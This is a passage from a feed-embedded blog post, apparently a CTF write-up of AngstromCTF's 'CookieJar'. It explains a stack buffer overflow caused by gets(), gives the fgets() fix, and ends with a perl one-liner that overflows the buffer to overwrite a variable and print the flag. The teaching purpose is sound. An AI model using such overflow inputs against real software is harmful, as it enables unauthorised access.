      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sorry, you only had %d cookies, try again!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of this seems pretty legit but there’s no way to increment this variable… We’re probably missing something.&lt;/p&gt;

&lt;h2 id=&quot;vulnerabilty-explanation&quot;&gt;Vulnerabilty explanation&lt;/h2&gt;

&lt;p&gt;I’ll give you a hint:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gets(buffer);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this moment, you must be like “Yeah… OK… tell me more” and it’s normal if you’ve never encountered this kind of vulnerability.&lt;/p&gt;

&lt;p&gt;However, this is probably one of the most common exploit and it’s called &lt;strong&gt;buffer overflow&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;what-is-a-buffer-overflow&quot;&gt;What is a buffer overflow?&lt;/h3&gt;

&lt;p&gt;When a variable is declared, space is allocated on the stack according to the size of our variable.&lt;/p&gt;

&lt;p&gt;Let’s take the example of the buffer from the challenge:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this instruction, &lt;strong&gt;64 bytes are allocated on the stack&lt;/strong&gt; in order to store the value contained in the buffer (A char is coded on a single byte in C).&lt;/p&gt;

&lt;p&gt;In compiled languages such as C, the memory is allocated at the compilation time and this process is sequential. It means that the next variable found in the code will be located above the previous one on the stack.&lt;/p&gt;

&lt;p&gt;Also keep in mind that &lt;strong&gt;the highest addresses are located at the bottom of the stack&lt;/strong&gt; in our architecture.&lt;/p&gt;

&lt;p&gt;In the source code of the challenge, the very interesting variable &lt;strong&gt;numCookies&lt;/strong&gt; is declared just before the buffer. In other words, &lt;strong&gt;the buffer will be stored right above numCookies on the stack.&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numCookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s represent the hypotetical state of the stack:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-06-05/stack-draw.png&quot; alt=&quot;State of the stack&quot; title=&quot;State of the stack&quot; width=&quot;70%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, you should be able to start guessing the impact of such vulnerability.&lt;/p&gt;

&lt;p&gt;Indeed, we have 64 bytes of memory allocated to our buffer, but what happens if we try to write more than 64 bytes?&lt;/p&gt;

&lt;p&gt;Any idea? … It simply &lt;strong&gt;overwrites the values&lt;/strong&gt; stored in variables that are located below the buffer on the stack.&lt;/p&gt;

&lt;h3 id=&quot;what-does-it-involve&quot;&gt;What does it involve?&lt;/h3&gt;

&lt;p&gt;Overwriting variables in the stack can result in random effects if the attacker doesn’t control the impacted variables.&lt;/p&gt;

&lt;p&gt;However, if the stack is perfectly controlled, the attack can occur a &lt;strong&gt;program crash&lt;/strong&gt; or &lt;strong&gt;provide full-rights on the machine&lt;/strong&gt; to the attacker by executing a shellcode.&lt;/p&gt;

&lt;p&gt;Buffer overflows only act as &lt;strong&gt;vectors of attack&lt;/strong&gt;, they represent a way of gaining access or executing code on the machine but they often don’t symbolize the attack in its entirety. Once the access is granted on the machine, the funny things can start…&lt;/p&gt;

&lt;p&gt;We will see more advanced exploits based on buffer overflows in future articles, don’t worry about that :wink:.&lt;/p&gt;

&lt;h2 id=&quot;detection-of-the-vulnerable-code&quot;&gt;Detection of the vulnerable code&lt;/h2&gt;

&lt;p&gt;Alright, this vulnerability seems really powerful but is there a way to prevent it? How do we identify the vulnerable piece of code?&lt;/p&gt;

&lt;p&gt;In our case, the vulnerability is simple to exploit because of the lack of user input control. The following part of the code is vulnerable because the developper didn’t verify the length of the user input.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A simple &lt;code class=&quot;highlighter-rouge&quot;&gt;man gets&lt;/code&gt; warns us about the usage of this function and its level of risk.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because gets()  will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security. Use fgets() instead.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is what a careful developer should have written:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;OR&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;If you were to retain one thing from this article, as a developer, it would be this: &lt;strong&gt;NEVER TRUST USER INPUT&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;Now that we have identified the &lt;strong&gt;vector of attack&lt;/strong&gt; and the piece of &lt;strong&gt;vulnerable code&lt;/strong&gt;, we can write the exploit!&lt;/p&gt;

&lt;p&gt;Our objective is to bypass this “if statement”: &lt;code class=&quot;highlighter-rouge&quot;&gt;if (numCookies &amp;gt;= 100){&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In order to do that, we have to set &lt;strong&gt;numCookies&lt;/strong&gt; to &lt;strong&gt;100 or greater&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Let’s get our hands dirty!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You get it, we have to submit more than 64 characters to the program.&lt;/p&gt;

&lt;p&gt;There are 2 methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;You can enter the 64 characters manually when the program asks for a number of cookies.&lt;/li&gt;
  &lt;li&gt;Or you can &lt;strong&gt;use a scripting language&lt;/strong&gt; such as python or perl to do it for you (Highly recommended).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To make sure the value of &lt;strong&gt;numCookies&lt;/strong&gt; is overwritten, we can write 80 characters thanks to the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@csb:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;x80'&lt;/span&gt; | ./cookiePublic64
Welcome to the Cookie Jar program!

In order to get the flag, you will need to have 100 cookies!

So, how many cookies are there &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the cookie jar:
Congrats, you have 1094795585 cookies!
Here&lt;span class=&quot;s1&quot;&gt;'s your flag: ----------REDACTED----------
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s working! Now, we just have to execute our exploit on the remote server in order to get the flag :blush:.&lt;/p&gt;

&lt;p&gt;I hope you now have a clearer idea of what is a buffer overflow. Do not hesitate to leave a comment or to contact me if you have any question or suggestion.&lt;/p&gt;

&lt;p&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">For my first article on this blog, I’ll present you my write-up of “CookieJar” from the AngstromCTF. This challenge was accessible and very straight-forward, which constitutes the prefect opportunity to introduce Buffer Overflows…</summary></entry></feed>